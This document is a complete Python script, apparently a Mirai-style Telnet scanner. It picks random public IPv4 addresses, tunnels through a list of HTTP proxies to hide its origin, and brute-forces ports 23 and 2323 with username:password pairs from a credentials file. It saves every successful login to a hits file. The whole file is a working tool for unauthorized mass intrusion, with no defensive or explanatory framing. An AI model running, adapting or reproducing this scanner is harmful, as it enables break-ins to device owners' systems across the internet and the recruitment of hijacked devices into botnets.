import asyncio
import random
import aiofiles

MAX_CONNS = 32  # Reduce concurrency for 1-core CPU
IP_BATCH_SIZE = 200
PROXY_LIST = "proxies.txt"
CREDS_FILE = "creds.txt"
HITS_FILE = "hits.txt"
PORTS = [23, 2323]
CONNECT_TIMEOUT = 5
LOGIN_TIMEOUT = 8

file_lock = asyncio.Lock()
http_proxies = []

class ScannerConnection:
    def __init__(self, dst_addr):
        self.state = "CLOSED"
        self.dst_addr = dst_addr
        self.dst_port = random.choice(PORTS)

def get_random_ip_batch(batch_size):
    reserved_prefixes = [
        "0.", "10.", "100.64.", "127.", "169.254.",
        "172.16.", "172.31.", "192.0.0.", "192.168.",
        "198.18.", "198.19.", *[f"{i}." for i in range(224, 256)]
    ]
    def is_reserved(ip):
        return any(ip.startswith(prefix) for prefix in reserved_prefixes)

    batch = set()
    while len(batch) < batch_size:
        ip = ".".join(str(random.randint(1, 254)) for _ in range(4))
        if not is_reserved(ip):
            batch.add(ip)
    return list(batch)

def load_proxies():
    with open(PROXY_LIST, "r") as f:
        return [line.strip() for line in f if ":" in line]

async def open_http_proxy_tunnel(proxy_ip, proxy_port, target_ip, target_port):
    try:
        reader, writer = await asyncio.wait_for(
            asyncio.open_connection(proxy_ip, int(proxy_port)), timeout=CONNECT_TIMEOUT
        )
        req = f"CONNECT {target_ip}:{target_port} HTTP/1.1\r\nHost: {target_ip}\r\n\r\n"
        writer.write(req.encode())
        await writer.drain()
        resp = await asyncio.wait_for(reader.readuntil(b"\r\n\r\n"), timeout=CONNECT_TIMEOUT)
        if b"200" in resp:
            return reader, writer
        writer.close()
        await writer.wait_closed()
    except:
        pass
    return None, None

async def save_success(ip, port, username, password):
    async with file_lock:
        async with aiofiles.open(HITS_FILE, "a") as f:
            await f.write(f"{ip}:{port} {username}:{password}\n")

async def attempt_login(ip, port, username, password):
    for proxy in random.sample(http_proxies, len(http_proxies)):
        proxy_ip, proxy_port = proxy.split(":")
        try:
            reader, writer = await open_http_proxy_tunnel(proxy_ip, proxy_port, ip, port)
            if reader and writer:
                writer.write((username + "\r\n").encode())
                await writer.drain()
                await asyncio.sleep(0.2)

                writer.write((password + "\r\n").encode())
                await writer.drain()
                await asyncio.sleep(0.5)

                data = await asyncio.wait_for(reader.read(512), timeout=LOGIN_TIMEOUT)
                writer.close()
                await writer.wait_closed()

                if b"$" in data or b"#" in data or b"Login" not in data:
                    print(f"[VALID] {ip}:{port} -> {username}:{password}")
                    await save_success(ip, port, username, password)
                    return True
        except:
            continue
    return False

async def try_all_creds_for_ip(ip, port, semaphore):
    async with semaphore:
        async with aiofiles.open(CREDS_FILE, "r") as f:
            async for line in f:
                if ":" not in line:
                    continue
                username, password = line.strip().split(":", 1)
                success = await attempt_login(ip, port, username, password)
                if success:
                    break  # Stop trying more creds on success

async def process_batch(ip_batch):
    semaphore = asyncio.Semaphore(MAX_CONNS)
    tasks = [
        asyncio.create_task(try_all_creds_for_ip(ip, random.choice(PORTS), semaphore))
        for ip in ip_batch
    ]
    await asyncio.gather(*tasks, return_exceptions=True)

async def main():
    global http_proxies
    http_proxies = load_proxies()
    print(f"[+] Loaded {len(http_proxies)} HTTP proxies")

    while True:
        ip_batch = get_random_ip_batch(IP_BATCH_SIZE)
        print(f"[+] Scanning batch of {len(ip_batch)} IPs")
        await process_batch(ip_batch)
        await asyncio.sleep(1.0)  # Delay to lower CPU usage

if __name__ == "__main__":
    asyncio.run(main())
